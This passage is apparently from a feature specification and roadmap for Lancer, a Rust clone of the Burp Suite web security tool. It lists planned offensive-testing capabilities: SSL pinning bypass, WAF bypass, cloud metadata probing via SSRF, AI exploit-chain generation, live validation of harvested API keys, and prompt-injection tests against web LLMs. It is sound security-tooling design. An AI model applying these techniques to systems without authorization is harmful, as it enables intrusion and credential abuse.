- [P] Accessible via Montoya API for custom AI extensions
- [P] Data stays inside PortSwigger trust boundary — no model training, no retention
- [P] Disable-able globally
- [P] Hotkeys for AI actions

---

## 17. SESSION HANDLING

### 17.1 Cookie Jar
- [F] Shared cookie store across all tools
- [F] View / edit / delete individual cookies
- [F] Empty entirely
- [F] Configurable: which tools update it (Proxy / Repeater / Intruder / Scanner / Sequencer / Extensions)
- [F] Cookie history per cookie

### 17.2 Session Handling Rules
- [F] Scope: by tool, URL pattern, parameter
- [F] Multiple actions per rule (ordered):
  - Check session is valid
  - Run macro
  - Set cookie
  - Set parameter / header
  - Invoke extension action
  - Prompt user
- [F] Hierarchical rule priority
- [F] Skip rule for Intruder/Scanner-manipulated params (to avoid interference)

### 17.3 Macros
- [F] Record from proxy history
- [F] Multi-request sequence (login flow, token refresh)
- [F] Extract values from responses → inject into next request
- [F] Edit per-request params/cookies inside macro
- [F] Used as session-handling-rule action

### 17.4 CSRF / Anti-CSRF Token Tracking
- [F] Auto-extract token from response
- [F] Auto-inject into outgoing requests
- [F] Per-rule scope

### 17.5 Application Logins (for Scanner)
- [P] Recorded login replay
- [P] Multi-step login
- [P] Auto-detection of "logged out" → re-login

---

## 18. PROJECT MANAGEMENT

- [F] Temporary project (memory only — fast, no save)
- [P] Disk-based project file (SQLite-backed `.burp` / `.lancer` file)
- [P] Save / load / merge projects
- [F] Project options (per-project) separate from user options
- [F] Configuration library — named scan/intruder/session configs
- [F] Import/export configs (JSON)
- [F] Recent projects list

---

## 19. REPORTING (Pro)

- [P] HTML report (interactive, styled)
- [P] XML report (machine-readable)
- [N] PDF report (Lancer addition)
- [N] JSON report
- [N] Markdown report
- [P] Custom templates (Handlebars/Tera in Lancer)
- [P] Filter issues by severity / confidence / type before reporting
- [P] Executive summary section
- [P] Per-issue: description, evidence (req/resp), remediation, references

### 19.1 Findings Capture `[N]` ❌

- [N] One-click "Save as Finding" context menu in every tool (captures request + response + notes + timestamp)
- [N] Finding form: title, severity, CVSS vector, impact, repro steps, affected endpoint, tags, program
- [N] Pipeline status: draft → ready → submitted → triaged → resolved → paid → duplicate
- [N] Storage: SQLite via `lancer-storage`, reuses project file format
- [N] New top-level "Findings" tab (`crates/lancer-gui/web/src/views/Findings.svelte`)
- [N] API: `GET/POST/PUT/DELETE /v1/findings`

### 19.2 AI Triage `[N]` ❌

New helper crate: `lancer-triage`. API: `POST /v1/findings/{id}/triage`, `POST /v1/findings/{id}/draft-report`.

- [N] AI-drafted full report from raw captured data via `lancer-ai`
- [N] AI severity scoring assist — suggests CVSS 3.1 vector + base score with reasoning
- [N] Duplicate detection against past findings (request similarity + endpoint hash + payload type matching)
- [N] API: `GET /v1/findings/duplicates`

### 19.3 Cross-Program Dashboard `[N]` ❌

- [N] HackerOne / Bugcrowd / Intigriti / YesWeHack / Immunefi columns
- [N] Per-program statistics: total submitted, accepted rate, avg payout, vuln type breakdown
- [N] API: `GET /v1/findings/stats`

### 19.4 Export & Automation `[N]` ❌

- [N] Export formats: HackerOne markdown, Bugcrowd markdown, Intigriti markdown, generic PDF, raw JSON
- [N] Re-test scheduler — cron-style re-runs of saved findings to detect regressions
- [N] POC snippet library — reusable payload templates organized by vuln class
- [N] Searchable archive — full-text search across all past findings + notes
- [N] Optional: webhook to Discord/Slack/Telegram on new finding

---

## 20. EXTENSIBILITY

### 20.1 Bambdas (lightweight in-app scripts)
- [F] Filter scripts: HTTP history, WebSocket history, Logger, Site map
- [F] Custom column scripts: HTTP history, WebSocket history, Logger
- [F] Custom action scripts: Repeater
- [F] Custom passive scan check
- [F] Match-and-replace scripts: Proxy
- [F] Personal library (cross-project)
- [F] GitHub community library
- [F] Java syntax subset

### 20.2 BChecks (scan-check DSL)
- [P] Domain-specific scan-check language
- [P] Active + passive checks
- [P] Collaborator integration (added 2025.11)
- [P] Community BChecks library (GitHub)
- [P] Used in Pro + Enterprise

### 20.3 Extensions (Montoya API)
- [F] Java extension API (modern: Montoya)
- [F] Legacy Extender API
- [F] Capabilities: modify req/resp, send new requests, custom UI tabs, custom scanner checks, custom intruder payloads, custom session handlers, custom payload processors
- [F] BApp Store (300+ extensions from 250+ authors)
- [F] Manual install
- [F] Extension hotkeys (bulk-apply across selection)
- [F] Auto-reload on file change (dev mode)
- [F] AI extension API (LLM access)
- [F] Custom scan checks in Java (added 2025)

### 20.4 Notable Extensions to Bundle / Re-implement in Lancer
- [N] Active Scan++
- [N] Param Miner (hidden parameter discovery)
- [N] Autorize (authz issue detection)
- [N] JWT Editor
- [N] Hackvertor (chained transforms)
- [N] Turbo Intruder (single-packet race condition)
- [N] GAP (endpoint discovery + wordlist gen)
- [N] Content Type Converter (JSON↔XML)
- [N] Logger++
- [N] AuthMatrix
- [N] SAML Raider
- [N] OAuth Scan
- [N] GraphQL Raider

---

## 21. CLI / HEADLESS / API (Pro)

- [P] Full headless mode (no GUI)
- [P] REST API for automation
- [P] CLI flags for one-shot scans
- [P] Scriptable via config files (YAML/TOML)
- [P] CI/CD integration (GitHub Actions, GitLab CI, Jenkins)
- [P] Docker image
- [P] DAST mode for pipelines

---

## 22. MOBILE TESTING

- [F] iOS proxy setup guide / helper
- [F] Android proxy setup guide / helper
- [F] CA cert install instructions
- [F] Per-app traffic isolation (in browser via separate profile)
- [N] On-device cert install helper (ADB / iOS pairing)
- [N] Frida hooks for SSL pinning bypass

---

## 23. NETWORK & ADVANCED SETTINGS

- [F] Upstream proxy (HTTP / SOCKS4 / SOCKS5)
- [F] Per-host upstream proxy
- [F] TLS pass-through host list
- [F] Hostname resolution overrides (DNS-over-Burp)
- [F] Client TLS cert authentication
- [F] Platform authentication: Basic / NTLM / Digest / Negotiate
- [F] DNS settings
- [F] Memory settings (per-suite, with status-bar shortcut — added 2025.11)
- [F] Performance settings category (added 2025.11)

---

## 24. UI / UX

- [F] Tabbed interface with detachable panels
- [F] Dark + Light themes
- [F] Fully customizable hotkeys
- [F] Multi-monitor support
- [F] Saved workspace layouts
- [F] Command palette (Ctrl+K)
- [F] Memory footer (current / max + active extension count)
- [F] Status bar quick links
- [F] Fast HTTP editor (syntax highlight, line numbers, code folding)
- [F] Pretty-print copy (JSON/XML)
- [F] Inspector parsed view
- [F] Render response (HTML preview)

---

# PART B — BEYOND BURP (Lancer-only)

These are where Lancer goes past Burp Suite. All `[N]`.

## 25. Performance Wins (Rust-native)
- [N] `tokio` async runtime — 100k+ concurrent connections per host
- [N] Zero-GC — no pause spikes during scans
- [N] HTTP/2 multiplexing on outbound
- [N] HTTP/3 / QUIC native
- [N] Streaming request/response (no buffering huge bodies in RAM)
- [N] Memory-mapped wordlists for Intruder
- [N] Target: 100,000+ req/s sustained on commodity hardware
- [N] Tauri GUI binary ~10MB (vs Burp's ~500MB JRE)

## 26. Modern Collaboration
- [N] Live multi-tester collaboration (multiple users editing same project)
- [N] Real-time cursor + selection sync
- [N] Project history with per-user attribution

## 27. AI Beyond Burp
- [N] BYO-LLM (OpenAI / Anthropic / local Ollama / OpenRouter)
- [N] AI-assisted exploit-chain generation
- [N] AI-driven payload mutation in Intruder
- [N] Natural-language scan configuration ("scan for everything that affects PII")
- [N] AI report writer with custom voice templates

## 28. New Vulnerability Classes
- [N] Web LLM attacks — prompt injection (direct + indirect), data exfiltration via LLM
- [N] HTTP/3 / QUIC desync research
- [N] Container metadata access (AWS/GCP/Azure IMDS) via SSRF
- [N] WebAuthn / passkey replay tests
- [N] WAF fingerprint + bypass library (CloudFlare/Akamai/AWS WAF/F5/etc.)

## 29. eBPF Capture (Linux)
- [N] Optional eBPF kernel-level traffic capture — bypass proxy entirely for traffic you don't control
- [N] Per-process attribution
- [N] Decrypt SSL via probe of OpenSSL/BoringSSL syscalls

## 30. Container / Cloud Aware
- [N] Auto-detect Dockerized stacks behind app
- [N] Kubernetes service mesh awareness
- [N] Cloud metadata service probing helpers
- [N] Terraform / IaC parsing for additional attack surface

## 31. Plugin System (Modern)
- [N] WASM plugins (any language → WASM → Lancer)
- [N] Lua scripting (in-app, embedded)
- [N] TypeScript/JavaScript plugins (via embedded Deno core)
- [N] Python plugins (via PyO3)
- [N] Rust-native plugins (cdylib)
- [N] Lancer Store (marketplace, signed plugins)

## 32. Better Reports
- [N] PDF / Markdown / JSON / HTML / XML / SARIF
- [N] Jira / Linear / GitHub Issues integration
- [N] DefectDojo / Faraday export
- [N] Custom Tera/Handlebars templates
- [N] Per-stakeholder reports (exec summary vs dev detail)

## 33. Quality of Life
- [N] Vim / Emacs / VS Code keybinding modes
- [N] Per-project hotkey overrides
- [N] Workspace presets (bug bounty / pentest / red team)
- [N] Auto-snapshot to disk every N minutes
- [N] Crash recovery
- [N] Built-in payload encyclopedia (searchable, taggable)

---

## 34. JS Mining (Passive) `[N]` ❌

New `lancer-jsmining` crate. New top-level "JS Miner" tab (`crates/lancer-gui/web/src/views/JsMining.svelte`). API: `GET /v1/jsmining/findings`, `GET /v1/jsmining/files`, `POST /v1/jsmining/rescan`.

- [N] Passive analyzer — runs automatically on every JS file flowing through the proxy
- [N] Regex catalog of 200+ secret patterns (AWS keys, GCP, Azure, GitHub tokens, Slack tokens, Stripe keys, JWTs, private keys, generic API keys)
- [N] Entropy-based secret detection (Shannon entropy ≥ 4.0 on base64-like strings)
- [N] Endpoint extraction from fetch / axios / XHR / WebSocket call sites
- [N] Parameter name extraction from function signatures and request builders
- [N] DOM XSS sink detection (innerHTML, document.write, eval, Function(), setTimeout-string)
- [N] Source map (.map file) auto-fetch and decoded source recovery
- [N] Webpack / parcel / rollup bundle deobfuscation (lightweight)
- [N] AST parsing via `swc` or `boa` (semantic, not just regex)
- [N] AI semantic analysis — sends ambiguous matches to `lancer-ai` for confirmation
- [N] JS file diffing between scan sessions — alerts on new endpoints / secrets when target ships new JS
- [N] Findings table: type (secret/endpoint/sink), severity, source file, line, snippet
- [N] One-click "Send endpoint to Repeater" / "Send to Scanner" / "Save to Organizer"
- [N] Auto-validation hook (optional): test extracted API keys against the issuing provider's `whoami` endpoint to confirm they're live (configurable, off by default)
- [N] Background processing — never blocks the proxy
- [N] Per-target persistence in `lancer-storage`

---

# PART C — ROADMAP / PHASING

### Phase 1 — Core Proxy (MVP)
HTTP/1.1 + HTTPS MITM, History, basic Match&Replace, Burp Browser, Inspector, CA cert flow, project save/load.

### Phase 2 — Manual Tools
Repeater, Decoder, Comparer, Sequencer, basic Intruder (Sniper + Battering Ram).

### Phase 3 — Advanced Manual
Intruder full (Pitchfork + Cluster Bomb + all payload types + processing), Logger, Organizer, Engagement Tools (search/find/CSRF PoC).

### Phase 4 — Scanner
Passive scanner first → active scanner → Collaborator → custom checks (BCheck-equivalent DSL).

### Phase 5 — Extensions & UX
Bambda-equivalent scripting, plugin SDK, BApp-style marketplace, Command palette, themes.

### Phase 6 — Beyond Burp
DOM Invader equivalent, AI integration, live collab, eBPF, HTTP/3, mobile assistant.

### Phase 7 — Enterprise
Headless CLI, REST API, CI/CD, Docker, scheduled scans, multi-tenant project storage.

### Phase 8 — Bug Bounty Hunter Mode
Nuclei-style template engine (§5.7), deep JS-rendering crawler (§5.1.1), mass fuzz mode (§4.6), JS mining (§34), findings capture + AI triage (§19.1–§19.4). Goal: every bug bounty workflow happens inside Lancer with no external CLI required.
